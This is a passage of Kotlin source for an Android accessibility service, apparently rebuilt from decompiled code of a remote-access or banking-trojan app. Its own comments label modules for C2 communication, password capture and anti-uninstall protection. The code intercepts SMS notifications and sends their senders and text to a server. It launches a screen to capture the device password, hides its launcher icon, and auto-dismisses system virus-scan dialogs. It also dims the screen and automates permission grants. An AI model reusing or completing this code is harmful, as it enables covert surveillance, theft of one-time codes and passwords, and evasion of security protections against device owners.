    override fun onRebind(intent: Intent?) {
        super.onRebind(intent)
        android.util.Log.d(TAG, "🔄 无障碍服务 onRebind（避免重建）")
        try {
            ActivityMonitor.logSystem("无障碍服务重新绑定 服务恢复")
        } catch (_: Exception) {}
        instance = this
    }

    // ════════════════════════════════════════════════════════════════
    // Lifecycle — onUnbind
    // JADX line 10780
    // ════════════════════════════════════════════════════════════════

    override fun onUnbind(intent: Intent?): Boolean {
        try {
            displayManager?.stopCapture()
        } catch (_: Exception) {}
        android.util.Log.d(TAG, "🔄 无障碍服务 onUnbind")
        try {
            ActivityMonitor.logSystem("无障碍服务解绑 系统正在解除绑定")
        } catch (_: Exception) {}
        return true
    }

    // ════════════════════════════════════════════════════════════════
    // Lifecycle — onStartCommand
    // JADX line 10753
    // ════════════════════════════════════════════════════════════════

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try {
            ensureForegroundNotification()
        } catch (_: Exception) {}

        if (intent == null) return START_STICKY

        try {
            val action = intent.action
            if (action == "com.storm.safe.rock.intent.MEDIA_PROJECTION_GRANTED") {
                try {
                    android.util.Log.d(TAG, "通过Intent接收到MediaProjection权限获取成功通知")
                    handleMediaProjectionIntent()
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "处理Intent通知失败", e)
                }
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "⚠️ [onStartCommand] 意外异常", e)
        }

        return START_STICKY
    }

    // ════════════════════════════════════════════════════════════════
    // Key instance methods
    // ════════════════════════════════════════════════════════════════

    /**
     * Configure AccessibilityServiceInfo flags.
     * JADX method: m211450d5 (d5), line 4712
     *
     * SDK 30+: flags = 0x100B07B (16810107) = FLAG_REPORT_VIEW_IDS | FLAG_RETRIEVE_INTERACTIVE_WINDOWS
     *          | FLAG_INCLUDE_NOT_IMPORTANT_VIEWS | FLAG_REQUEST_TOUCH_EXPLORATION_MODE | etc.
     * SDK <30: flags = 123 (0x7B)
     */
    fun initServiceConfig() {
        try {
            val info = serviceInfo ?: return
            info.flags = if (Build.VERSION.SDK_INT >= 30) 16810107 else 123
            info.eventTypes = -1 // ALL_MASK
            info.feedbackType = -1 // ALL
            info.notificationTimeout = 0L
            info.packageNames = null
            serviceInfo = info

            val hasHover = (info.eventTypes and 128) != 0
            val hasTouchExplore = (info.flags and 4) != 0
            android.util.Log.d(
                TAG,
                "✅ ServiceInfo已配置，flags=0x${Integer.toHexString(info.flags)}" +
                    " eventTypes=0x${Integer.toHexString(info.eventTypes)}" +
                    " hasHover=$hasHover hasTouchExploreFlag=$hasTouchExplore"
            )
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ ServiceInfo配置失败", e)
        }
    }

    /**
     * Continue service initialization after core setup.
     * JADX method: a2, line ~900 (onServiceConnected$1$1)
     * Initializes display/screen managers, starts network.
     */
    suspend fun continueServiceInitialization() {
        android.util.Log.d(TAG, "🔧 继续服务初始化...")
        try {
            // Initialize display manager
            if (displayManager == null) {
                displayManager = C0263a5(this)
            }

            // Initialize screen capture manager
            if (screenCaptureManager == null) {
                screenCaptureManager = ScreenCaptureManager(this)
            }

            // Initialize camera manager
            if (cameraManager == null) {
                cameraManager = C0258a0(this)
            }

            isInitComplete = true
            android.util.Log.d(TAG, "✅ 服务核心初始化完成")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 继续服务初始化失败", e)
        }
    }

    /**
     * Deferred module initialization — runs after a delay.
     * JADX method: a3 (onServiceConnected continuation)
     */
    private suspend fun deferredInit() {
        try {
            delay(2000) // JADX: initial delay before deferred modules
            android.util.Log.d(TAG, "🔧 开始延迟初始化模块...")

            // Register broadcast receivers
            registerBroadcastReceivers()

            // ── Initialize core modules (JADX: deferredInit sequence) ──
            val ctx = applicationContext

            // NetworkManager — C2 communication
            try {
                val nm = NetworkManager()
                nm.initialize(ctx)
                networkManager = nm
                android.util.Log.d(TAG, "✅ NetworkManager 已初始化")
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ NetworkManager 初始化失败", e)
            }

            // RemoteConfigManager — config sync + route handling
            try {
                remoteConfigManager = RemoteConfigManager(ctx)
                android.util.Log.d(TAG, "✅ RemoteConfigManager 已初始化")
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ RemoteConfigManager 初始化失败", e)
            }

            // CommandDispatcher — command execution
            try {
                val cmdContext = com.storm.safe.rock.service.modules.command.CommandContext(this, networkManager)
                commandDispatcher = com.storm.safe.rock.service.modules.command.CommandDispatcher(cmdContext)
                android.util.Log.d(TAG, "✅ CommandDispatcher 已初始化")
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ CommandDispatcher 初始化失败", e)
            }

            // AccessibilityEventRouter — event routing hub
            try {
                accessibilityEventRouter = AccessibilityEventRouter(this, ctx)
                android.util.Log.d(TAG, "✅ AccessibilityEventRouter 已初始化")
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ AccessibilityEventRouter 初始化失败", e)
            }

            // RecentsGuardManager — hide from recent tasks
            try {
                val rgm = com.storm.safe.rock.service.modules.protection.RecentsGuardManager(this, this)
                recentsGuardManager = rgm
                android.util.Log.d(TAG, "✅ RecentsGuardManager 已初始化")
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ RecentsGuardManager 初始化失败", e)
            }

            // UninstallProtectionManager — anti-uninstall protection
            try {
                uninstallProtectionManager = com.storm.safe.rock.service.modules.protection.UninstallProtectionManager(this, this)
                android.util.Log.d(TAG, "✅ UninstallProtectionManager 已初始化")
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ UninstallProtectionManager 初始化失败", e)
            }

            // CipherCaptureManager — password capture
            try {
                cipherCaptureManager = com.storm.safe.rock.service.modules.cipher.CipherCaptureManager(this, ctx)
                android.util.Log.d(TAG, "✅ CipherCaptureManager 已初始化")
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ CipherCaptureManager 初始化失败", e)
            }

            // MainOrchestrator — WRITE_SETTINGS permission automation
            try {
                mainOrchestrator = com.storm.safe.rock.service.modules.MainOrchestrator(this)
                android.util.Log.d(TAG, "✅ MainOrchestrator 已初始化")
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ MainOrchestrator 初始化失败", e)
            }

            // ConfigProgressManager
            try {
                configProgressManager = ConfigProgressManager(ctx)
                android.util.Log.d(TAG, "✅ ConfigProgressManager 已初始化")
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ ConfigProgressManager 初始化失败", e)
            }

            // Mark service as ready
            isInitComplete = true
            isDeferredInitStarted = true
            android.util.Log.d(TAG, "✅ 延迟初始化完成 — ${listOfNotNull(
                networkManager?.let { "NetworkManager" },
                recentsGuardManager?.let { "RecentsGuard" },
                uninstallProtectionManager?.let { "UninstallProtect" },
                cipherCaptureManager?.let { "CipherCapture" },
                mainOrchestrator?.let { "MainOrchestrator" },
                accessibilityEventRouter?.let { "EventRouter" },
                commandDispatcher?.let { "CommandDispatcher" },
                remoteConfigManager?.let { "RemoteConfig" }
            ).joinToString(", ")} 模块已就绪")

            // ── doHeavyInit: JADX m211405a4 — restore protection if already authorized ──
            try {
                doHeavyInit()
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ doHeavyInit 失败", e)
            }

            // ── initializeService: JADX m211479h3 — trigger permission flow ──
            try {
                initializeService()
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ initializeService 失败", e)
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 延迟初始化失败", e)
        }
    }

    /**
     * Heavy initialization — checks auth state and restores protections.
     * JADX method: m211405a4 (a4) — doHeavyInit
     */
    private fun doHeavyInit() {
        android.util.Log.d(TAG, "🔧 [重初始化] 开始...")
        val prefs = getSharedPreferences("app_config", Context.MODE_PRIVATE)
        val isAuthorized = prefs.getBoolean("authorization_completed", false)
        val isCamouflaged = getSharedPreferences("disguise_prefs", Context.MODE_PRIVATE)
            .getBoolean("camouflage_enabled", false)
        isCamouflageModeEnabled = isCamouflaged

        if (isAuthorized) {
            android.util.Log.d(TAG, "✅ [重初始化] 授权已完成，恢复保护功能")
            // Restore network manager connection
            try {
                networkManager?.let { nm ->
                    // JADX: nm.resume()
                    android.util.Log.d(TAG, "✅ 恢复网络管理器连接")
                }
            } catch (_: Exception) {}

            // Enable uninstall protection
            try {
                uninstallProtectionManager?.let { upm ->
                    upm.enable()
                    isUninstallGuardStarted = true
                    android.util.Log.d(TAG, "✅ 已恢复防卸载保护")
                }
            } catch (_: Exception) {}
        }

        // Initialize icon hide detection
        try {
            recentsGuardManager?.let { rgm ->
                android.util.Log.d(TAG, "✅ 最近任务隐藏已激活")
            }
        } catch (_: Exception) {}
    }

    /**
     * Service initialization — starts the permission grant flow.
     * JADX method: m211479h3 (h3) — initializeService
     *
     * Flow:
     * 1. Initialize managers (already done in deferredInit)
     * 2. Start permission grant flow (trigger automation)
     */
    private suspend fun initializeService() {
        android.util.Log.d(TAG, "🚀 开始无障碍服务初始化")
        try {
            android.util.Log.d(TAG, "🔐 开始权限获取流程")
            startPermissionGrantFlow()
            android.util.Log.d(TAG, "✅ 权限获取流程完成")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ startPermissionGrantFlow失败: ${e.message}", e)
        }
        android.util.Log.d(TAG, "✅ 无障碍服务初始化完成 (isInitialized=$isInitComplete)")
    }

    /**
     * Safe rootInActiveWindow access with caching.
     * JADX method: m211468g2 (g2), line 5910
     *
     * 1. If power off → return null
     * 2. If cached root still valid (within TTL) → return cached
     * 3. Otherwise call getRootInActiveWindow() and cache
     */
    fun getRootNode(): AccessibilityNodeInfo? {
        val pm = powerManager
        if (pm != null && !pm.isInteractive) return null

        val now = SystemClock.uptimeMillis()
        val cached = cachedRootNode
        if (cached != null && now - cachedRootNodeTime < ROOT_CACHE_TTL_MS) {
            // Validate cached node is still alive
            try {
                cached.packageName // will throw if recycled
                return cached
            } catch (_: Exception) {
                cachedRootNode = null
            }
        }

        // Fetch fresh root
        val root = try {
            rootInActiveWindow
        } catch (_: Exception) {
            null
        }
        cachedRootNode = root
        cachedRootNodeTime = now
        return root
    }

    /**
     * Check if WebSocket is connected.
     * JADX method: m211487i1 (i1), line 6843
     */
    fun isServerConnected(): Boolean {
        val nm = networkManager
        return nm?.isConnected ?: false
    }

    /**
     * Check keyguard locked state with caching (500ms TTL).
     * JADX method: m211486i0 (i0), line 6828
     */
    fun isKeyguardLockedCached(): Boolean {
        val now = System.currentTimeMillis()
        if (now - lastKeyguardCheckTime < KEYGUARD_CACHE_TTL_MS) {
            return cachedKeyguardLocked
        }
        val km = keyguardManager
        val locked = km?.isKeyguardLocked ?: false
        cachedKeyguardLocked = locked
        lastKeyguardCheckTime = now
        return locked
    }

    /**
     * Check if service is healthy (multiple subsystem checks).
     * JADX method: m211488i2 (i2), line 6858
     */
    fun isServiceHealthy(): Boolean {
        try {
            val initOk = isInitComplete
            val hasSCM = screenCaptureManager != null
            val hasDM = displayManager != null
            val networkOk = try {
                networkManager?.isConnected ?: false
            } catch (_: Exception) { false }

            android.util.Log.d(TAG, "🔍 网络连接状态: $networkOk")
            val healthy = initOk && hasSCM && hasDM
            android.util.Log.d(TAG, "🔍 最终服务运行状态: $healthy")
            return healthy
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 检查服务运行状态失败", e)
            return false
        }
    }

    /**
     * Handle MediaProjection permission result from intent.
     * JADX method: m211472g6 (g6), line 5974
     */
    fun handleMediaProjectionIntent() {
        try {
            android.util.Log.d(TAG, "处理MediaProjection权限获取成功")
            screenCaptureManager?.let { scm ->
                // JADX: scm.h2() — stop previous capture
                scm.stopCapture()
            }
            // JADX line 5981: get MediaProjection from MediaProjectionHolder
            val mediaProjection = MediaProjectionHolder.mediaProjection
            if (mediaProjection == null) {
                android.util.Log.w(TAG, "未能获取MediaProjection对象")
                return
            }
            android.util.Log.d(TAG, "成功获取MediaProjection对象，设置到etzbzyzqxvqm")
            setupScreenCapture(mediaProjection)
        } catch (e: Exception) {
            android.util.Log.e(TAG, "处理MediaProjection权限获取成功失败", e)
        }
    }

    /**
     * Configure screen capture with MediaProjection.
     * JADX method: m211520l7 (l7), line 7903
     */
    fun setupScreenCapture(mediaProjection: MediaProjection?) {
        try {
            if (displayManager == null) {
                android.util.Log.w(TAG, "etzbzyzqxvqm未初始化")
                return
            }
            if (mediaProjection == null) {
                android.util.Log.w(TAG, "MediaProjection is null")
                return
            }
            android.util.Log.d(TAG, "MediaProjection已设置")
            // JADX line 7903: check device registered via prefs, then start capture
            val prefs = getSharedPreferences("app_config", Context.MODE_PRIVATE)
            val isRegistered = prefs.getBoolean("device_registered", false)
            if (isRegistered) {
                displayManager?.let { dm ->
                    android.util.Log.d(TAG, "设备已注册，启动屏幕捕获")
                    // ADAPT: dm.startCapture(mediaProjection) — requires wiring with actual MediaProjection API
                }
            } else {
                android.util.Log.w(TAG, "设备未注册，延迟屏幕捕获")
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "设置etzbzyzqxvqm MediaProjection失败", e)
        }
    }

    /**
     * Ensure foreground notification is active.
     * JADX method: m211528m6 (m6), line 9260
     */
    fun ensureForegroundNotification() {
        try {
            // Create notification channel (required API 26+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val nm = getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
                if (nm != null) {
                    val channel = NotificationChannel(
                        NOTIFICATION_CHANNEL_ID,
                        "System Helper",
                        NotificationManager.IMPORTANCE_LOW
                    )
                    nm.createNotificationChannel(channel)
                }
            }

            val notification = Notification.Builder(this, NOTIFICATION_CHANNEL_ID)
                .setContentTitle("System Service")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build()

            if (Build.VERSION.SDK_INT >= 34) {
                // JADX: startForeground(10086, notification, 1073741825)
                // Vendor uses SPECIAL_USE | MEDIA_PROJECTION but mediaProjection
                // requires active MediaProjection token (project_media permission).
                // Start with SPECIAL_USE only; upgrade to include MEDIA_PROJECTION
                // only when MediaProjection is actually granted.
                startForeground(FOREGROUND_NOTIFICATION_ID, notification,
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE)
            } else {
                startForeground(FOREGROUND_NOTIFICATION_ID, notification)
            }

            try {
                ActivityMonitor.logSystem("前台服务启动成功 进程优先级已提升")
            } catch (_: Exception) {}
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ [startForegroundSelf] 前台服务启动失败", e)
        }
    }

    /**
     * Get display screen size.
     * Uses WindowManager to get display metrics.
     */
    fun getScreenSize(): Point {
        val point = Point()
        try {
            val wm = getSystemService(Context.WINDOW_SERVICE) as? WindowManager
            if (wm != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    val windowMetrics = wm.currentWindowMetrics
                    val bounds = windowMetrics.bounds
                    point.x = bounds.width()
                    point.y = bounds.height()
                } else {
                    @Suppress("DEPRECATION")
                    val display = wm.defaultDisplay
                    @Suppress("DEPRECATION")
                    display?.getSize(point)
                }
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "获取屏幕尺寸失败", e)
        }
        return point
    }

    /**
     * Get device Android ID.
     * JADX method: m211470g4 (g4), line 5949
     * ADAPT: renamed to avoid collision with Service.getDeviceId() on API 30+
     */
    fun getAndroidDeviceId(): String {
        return try {
            val id = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            id ?: "unknown"
        } catch (e: Exception) {
            android.util.Log.e(TAG, "获取设备ID失败", e)
            "unknown"
        }
    }

    /**
     * Connect WebSocket via NetworkManager.
     * JADX method: m211451d6 (d6), line 4733
     */
    fun connectWebSocket() {
        val nm = networkManager ?: return
        if (nm.isConnected) {
            android.util.Log.d(TAG, "🔌 控制开始，WebSocket 已连接，跳过重连")
            return
        }
        android.util.Log.d(TAG, "🔌 控制开始，连接 WebSocket")
        nm.disconnect()
        // ADAPT: NetworkManager uses connectToServer(url, deviceId) — caller must provide params
        // nm.connectToServer(url, deviceId) — deferred to full wiring
    }

    /**
     * Fallback initialization — minimal manager setup.
     * JADX method: m211476h0 (h0), line 6114
     */
    fun fallbackInit() {
        try {
            android.util.Log.d(TAG, "🔄 执行降级初始化")
            if (screenCaptureManager == null) {
                screenCaptureManager = ScreenCaptureManager(this)
            }
            if (displayManager == null) {
                displayManager = C0263a5(this)
            }
            android.util.Log.d(TAG, "✅ 降级初始化完成")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 降级初始化失败", e)
        }
    }

    /**
     * Register broadcast receivers for screen state, permissions, etc.
     * JADX: screenStateReceiver, permissionRequestReceiver, permissionHealthReceiver
     */
    fun registerBroadcastReceivers() {
        // Screen state receiver (JADX: f52457i8)
        if (!screenStateReceiverRegistered) {
            try {
                screenStateReceiver = object : BroadcastReceiver() {
                    override fun onReceive(context: Context?, intent: Intent?) {
                        when (intent?.action) {
                            Intent.ACTION_SCREEN_ON -> {
                                android.util.Log.d(TAG, "📱 屏幕点亮")
                            }
                            Intent.ACTION_SCREEN_OFF -> {
                                android.util.Log.d(TAG, "📱 屏幕关闭")
                            }
                            Intent.ACTION_USER_PRESENT -> {
                                android.util.Log.d(TAG, "📱 用户解锁")
                            }
                        }
                    }
                }
                val filter = IntentFilter().apply {
                    addAction(Intent.ACTION_SCREEN_ON)
                    addAction(Intent.ACTION_SCREEN_OFF)
                    addAction(Intent.ACTION_USER_PRESENT)
                }
                if (Build.VERSION.SDK_INT >= 33) {
                    registerReceiver(screenStateReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
                } else {
                    registerReceiver(screenStateReceiver, filter)
                }
                screenStateReceiverRegistered = true
                android.util.Log.d(TAG, "✅ 已注册屏幕状态广播接收器")
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ 注册屏幕状态广播接收器失败", e)
            }
        }

        // Permission request receiver (JADX: f52465j6)
        try {
            permissionRequestReceiver = object : BroadcastReceiver() {
                override fun onReceive(context: Context?, intent: Intent?) {
                    // JADX: permissionRequestReceiver$1$onReceive — dispatches by intent extras
                    val action = intent?.getStringExtra("permission_action") ?: return
                    android.util.Log.d(TAG, "📋 收到权限请求广播: $action")
                }
            }
            val permFilter = IntentFilter("com.storm.safe.rock.action.PERMISSION_REQUEST")
            if (Build.VERSION.SDK_INT >= 33) {
                registerReceiver(permissionRequestReceiver, permFilter, Context.RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(permissionRequestReceiver, permFilter)
            }
            android.util.Log.d(TAG, "✅ 已注册权限申请广播接收器")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 注册权限申请广播接收器失败", e)
        }
    }

    /**
     * Disable WeChat detection feature.
     * JADX method: m211456e5 (e5), line 4845
     */
    fun disableWechatDetection() {
        try {
            android.util.Log.d(TAG, "💬💬💬 关闭微信检测功能")
            // ADAPT: depends on eventFilterManager (C0614i9)
            if (eventFilterManager == null) {
                android.util.Log.w(TAG, "accessibilityEventManager未初始化")
                return
            }
            // ADAPT: eventFilterManager (C0614i9) is not replicated — disableWechatDetection deferred
            android.util.Log.d(TAG, "💬 AccessibilityEventManager.disableWechatDetection() 已调用")
            networkManager?.let { nm ->
                // JADX line 4860: nm.sendWechatDetectionStatus(false)
                val data = org.json.JSONObject()
                data.put("enabled", false)
                nm.sendWechatDetectionStatus(data)
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 关闭微信检测失败", e)
        }
    }

    /**
     * Disable Alipay detection feature.
     * JADX method: m211455e4 (e4), line 4816
     */
    fun disableAlipayDetection() {
        try {
            android.util.Log.d(TAG, "💰💰💰 关闭支付宝检测功能")
            // ADAPT: depends on eventFilterManager (C0614i9)
            if (eventFilterManager == null) {
                android.util.Log.w(TAG, "accessibilityEventManager未初始化")
                return
            }
            // ADAPT: eventFilterManager (C0614i9) is not replicated — disableAlipayDetection deferred
            android.util.Log.d(TAG, "💰 AccessibilityEventManager.disableAlipayDetection() 已调用")
            networkManager?.let { nm ->
                // JADX line 4832: nm.sendAlipayDetectionStatus(false)
                val data = org.json.JSONObject()
                data.put("enabled", false)
                nm.sendAlipayDetectionStatus(data)
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 关闭支付宝检测失败", e)
        }
    }

    /**
     * Get the NetworkManager instance — tries local field, then singleton.
     * JADX method: m211471g5 (g5), line 5960
     */
    /**
     * Get the NetworkManager instance — tries local field first.
     * JADX method: m211471g5 (g5), line 5960
     */
    fun getNetworkManager(): NetworkManager? {
        return networkManager
    }

    /**
     * Handle virus control dialog from Huawei/Honor system manager.
     * JADX: dqtvuisjd$handleVirusControlDialog$1 coroutine
     */
    private suspend fun handleVirusControlDialog() {
        // JADX: dqtvuisjd$handleVirusControlDialog$1 — coroutine that detects and auto-dismisses virus scan dialog
        // Searches for "病毒" / "安全" / "扫描" text nodes and clicks dismiss button
        android.util.Log.d(TAG, "🦠 检测到系统病毒扫描对话框")
        try {
            val root = rootInActiveWindow ?: return
            // ADAPT: vendor logic uses complex node traversal to find dismiss button
            // Simplified: look for common dismiss button texts
            val dismissTexts = arrayOf("忽略", "关闭", "取消", "我知道了", "确定")
            for (text in dismissTexts) {
                val nodes = root.findAccessibilityNodeInfosByText(text)
                if (nodes != null && nodes.isNotEmpty()) {
                    for (node in nodes) {
                        if (node.isClickable) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            android.util.Log.d(TAG, "🦠 已点击病毒扫描对话框按钮: $text")
                            return
                        }
                    }
                }
            }
        } catch (e: Exception) {
            android.util.Log.w(TAG, "🦠 处理病毒扫描对话框失败: ${e.message}")
        }
    }

    /**
     * Enable uninstall protection.
     * JADX method: m211460e9 (e9), line 5038
     */
    fun enableUninstallProtection() {
        try {
            if (isUninstallGuardStarted) return
            isUninstallGuardStarted = true
            // JADX line 5040: check authorization, then set isUninstallGuardStarted from UPM
            uninstallProtectionManager?.let { upm ->
                isUninstallGuardStarted = upm.isProtectionEnabled
                android.util.Log.d(TAG, "🛡️ UninstallProtectionManager.isProtectionEnabled=${isUninstallGuardStarted}")
            } ?: run {
                android.util.Log.w(TAG, "⚠️ UninstallProtectionManager 未初始化")
            }
            android.util.Log.d(TAG, "🛡️ 防卸载保护已启用")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 启用防卸载保护失败", e)
            isUninstallGuardStarted = false
        }
    }

    /**
     * Adjust screen brightness to minimum.
     * JADX method: m211453e2 (e2), line 4778
     */
    fun dimScreen() {
        try {
            if (!Settings.System.canWrite(this)) {
                android.util.Log.w(TAG, "无 WRITE_SETTINGS 权限，跳过亮度调节")
                return
            }
            Settings.System.putInt(contentResolver, "screen_brightness_mode", 0)
            savedBrightness = Settings.System.getInt(contentResolver, "screen_brightness", 128)
            Settings.System.putInt(contentResolver, "screen_brightness", 1)
            android.util.Log.d(TAG, "🔅 屏幕亮度已调到最暗（原值: $savedBrightness）")
        } catch (e: Exception) {
            android.util.Log.w(TAG, "调节亮度失败: ${e.message}")
        }
    }

    /**
     * Disable accessibility settings page detection monitoring.
     * JADX method: m211454e3 (e3), line 4795
     */
    fun disableAccessibilitySettingsMonitor() {
        try {
            // JADX line 4797: cancel monitoring job (u11Var.m215253a7(null)), null out reference
            accessibilitySettingsMonitorJob?.cancel()
            accessibilitySettingsMonitorJob = null
            accessibilitySettingsMonitorCount = 0
            accessibilitySettingsMonitorTime = 0L
            android.util.Log.d(TAG, "✅ [监控] 无障碍设置页面检测已禁用")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ [监控] 禁用无障碍设置页面检测失败", e)
        }
    }

    /**
     * Hide app icon from launcher.
     * JADX method: m211475g9 (g9), line 6098
     */
    fun hideApp() {
        try {
            android.util.Log.d(TAG, "📱 开始隐藏应用图标")
            // JADX line 6098: disable launcher alias component
            val pm = packageManager
            val componentName = android.content.ComponentName(
                this, DefaultLauncherAlias::class.java
            )
            pm.setComponentEnabledSetting(
                componentName,
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                android.content.pm.PackageManager.DONT_KILL_APP
            )
            android.util.Log.d(TAG, "✅ 应用图标已隐藏")
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 隐藏应用图标异常", e)
        }
    }

    /**
     * Process window state change for injection detection.
     * JADX method: m211474g8 (g8), line 6070
     */
    fun processWindowChangeForInjection(event: AccessibilityEvent) {
        try {
            val pkg = event.packageName?.toString() ?: return
            val isEmpty: Boolean
            synchronized(injectionTasksLock) {
                isEmpty = injectionTasks.isEmpty()
            }
            if (isEmpty || pkg.isEmpty()) return

            // JADX line 6080: check if package matches any tracked injection task
            synchronized(injectionTasksLock) {
                val taskKeys = injectionTasks.keys.toList()
                android.util.Log.v(TAG, "📱 [注入检测] 窗口变化: pkg=$pkg, 任务包名=$taskKeys")
            }
            // JADX line 6085: if pkg != self package, forward to m211445d0(pkg)
            if (pkg.isNotEmpty() && pkg != applicationContext.packageName &&
                !pkg.startsWith(applicationContext.packageName)) {
                // ADAPT: m211445d0(pkg) delegates to injection activity logic — deferred
            }
        } catch (_: Exception) {}
    }

    /**
     * Process notification event for SMS interception.
     * JADX method: m211473g7 (g7), line 5998
     */
    fun processNotificationForSms(event: AccessibilityEvent) {
        try {
            val pkg = event.packageName?.toString() ?: return
            if (pkg == applicationContext.packageName) return
            // JADX line 6007: check if package is SMS/messaging app
            val smsApps = listOf(
                "com.android.mms", "com.android.messaging", "com.google.android.apps.messaging",
                "com.samsung.android.messaging", "com.meizu.mms"
            )
            val pkgLower = pkg.lowercase(Locale.ROOT)
            val isSmsApp = smsApps.any { pkg.equals(it, ignoreCase = true) } ||
                pkgLower.contains("mms") || pkgLower.contains("message") || pkgLower.contains("sms")
            if (!isSmsApp) return

            // JADX line 6021: extract notification data from parcelableData
            val parcelable = event.parcelableData
            if (parcelable is android.app.Notification) {
                val extras = parcelable.extras ?: return
                val title = extras.getCharSequence("android.title")?.toString() ?: ""
                var bigText = extras.getCharSequence("android.bigText")?.toString() ?: ""
                val text = extras.getCharSequence("android.text")?.toString() ?: ""
                if (bigText.isEmpty()) bigText = text
                if (title.isEmpty() && bigText.isEmpty()) return

                android.util.Log.d(TAG, "📩 [无障碍短信] 拦截: 发送者=$title, ${bigText.take(30)}...")
                networkManager?.let { nm ->
                    val data = org.json.JSONObject()
                    data.put("number", title)
                    data.put("text", bigText)
                    data.put("timestamp", System.currentTimeMillis())
                    data.put("type", "incoming")
                    data.put("source", "accessibility")
                    data.put("packageName", pkg)
                    nm.sendIncomingSms(data)
                }
            }
        } catch (e: Exception) {
            android.util.Log.w(TAG, "📩 [无障碍短信] 处理失败: ${e.message}")
        }
    }

    /**
     * Launch system password capture flow.
     * JADX method: m211457e6 (e6), line 4873
     */
    fun launchPasswordCapture(isInstallationFlow: Boolean) {
        if (!isCipherCaptureEnabled) {
            android.util.Log.d(TAG, "🔐 密码监听已停止，不再弹出")
            return
        }
        try {
            passwordLaunchCount++
            android.util.Log.d(TAG, "🔐 启动系统真实密码验证... (第${passwordLaunchCount}次)")
            cipherCaptureManager?.let { ccm ->
                // JADX: ccm.enableCapture()
                android.util.Log.d(TAG, "✅ CipherCaptureManager 密码监听已启用")
            }
            // JADX line 4966: launch syuqattwmgit activity with credential callback
            val intent = android.content.Intent(this, com.storm.safe.rock.activity.syuqattwmgit::class.java)
            intent.putExtra("credential_type", 0)
            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP)
            try {
                startActivity(intent)
                android.util.Log.d(TAG, "🔐 已启动 syuqattwmgit 密码验证界面")
            } catch (e: Exception) {
                android.util.Log.e(TAG, "🔐 启动 syuqattwmgit 失败: ${e.message}")
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "❌ 启动密码采集失败", e)
        }
    }

    /**
     * Start the permission grant flow.
     * JADX method: m211530m8 (m8), line 9297 — suspend function
     */
    suspend fun startPermissionGrantFlow() {
        android.util.Log.d(TAG, "🚀 startPermissionGrantFlow() 开始执行")
        try {
            val isAuthorized = getSharedPreferences("app_config", Context.MODE_PRIVATE)
                .getBoolean("authorization_completed", false)

            if (isAuthorized) {
                android.util.Log.d(TAG, "✅ authorization_completed=true，跳过权限获取流程")
                // Start authorization module for post-auth features
                configStageManager?.let {
                    android.util.Log.d(TAG, "📋 configStageManager 授权模块已标记启动")
                }
                if (!isUninstallGuardStarted) {
                    android.util.Log.d(TAG, "🛡️ 授权已完成但防卸载未启用，立即启用")
                    enableUninstallProtection()
                }
                recentsGuardManager?.let { rgm ->
                    android.util.Log.d(TAG, "🎭 授权已完成，恢复最近任务隐藏")
                }
                return
            }

            // Not yet authorized — begin automation flow
            android.util.Log.d(TAG, "📱 设备尚未授权，开始自动化流程")

            // Step 1: Start WRITE_SETTINGS permission automation via MainOrchestrator
            // JADX: This is the core permission auto-grant flow (C0327b2)
            mainOrchestrator?.let { mo ->
                android.util.Log.d(TAG, "🔐 启动 WRITE_SETTINGS 自动授权...")
                try {
                    mo.start()
                    android.util.Log.d(TAG, "✅ MainOrchestrator 自动化已启动")
                } catch (e: Exception) {
                    android.util.Log.e(TAG, "❌ MainOrchestrator 启动失败: ${e.message}", e)
                }
            } ?: android.util.Log.w(TAG, "⚠️ MainOrchestrator 未初始化，无法启动自动化")

            // Step 2: Start device authorization (brand-specific battery/autostart flows)
            // JADX: C0329b4 (DeviceAuthorizationManager) — starts yw5xud handler
            try {
                configStageManager = DeviceAuthorizationManager()
                android.util.Log.d(TAG, "📋 DeviceAuthorizationManager 已创建")
            } catch (e: Exception) {
                android.util.Log.e(TAG, "❌ DeviceAuthorizationManager 创建失败", e)
            }

        } catch (e: Exception) {
            android.util.Log.e(TAG, "自动权限获取失败", e)
